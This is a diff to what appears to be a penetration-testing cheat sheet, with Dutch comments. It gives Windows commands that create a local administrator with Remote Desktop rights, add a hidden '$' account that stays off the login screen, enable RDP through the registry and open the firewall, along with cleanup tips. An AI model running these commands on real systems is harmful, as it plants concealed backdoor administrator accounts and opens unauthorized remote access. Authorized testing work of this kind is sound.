@@ -1,1 +1,16 @@
-NET USER jan-karel C0mpl3x.teit /ADD && NET localgroup "Administrators" /ADD jan-karel && NET localgroup "Remote Desktop Users" /ADD jan-karel
+# Windows - Lokale gebruiker aanmaken met admin + RDP rechten
+# Vereist: Administrator/SYSTEM rechten
+NET USER pentester C0mpl3x.P@ssw0rd! /ADD
+NET localgroup "Administrators" /ADD pentester
+NET localgroup "Remote Desktop Users" /ADD pentester
+# Verborgen gebruiker (verschijnt niet op login scherm):
+NET USER pentester$ C0mpl3x.P@ssw0rd! /ADD
+NET localgroup "Administrators" /ADD pentester$
+# RDP inschakelen (als het uit staat):
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+# Opruimen na de test:
+NET USER pentester /DELETE
+# Tip: Gebruik $ achter de username om de account te verbergen
+# Tip: Wijzig het wachtwoord naar iets unieks per engagement
+# Tip: Documenteer altijd aangemaakte accounts voor cleanup
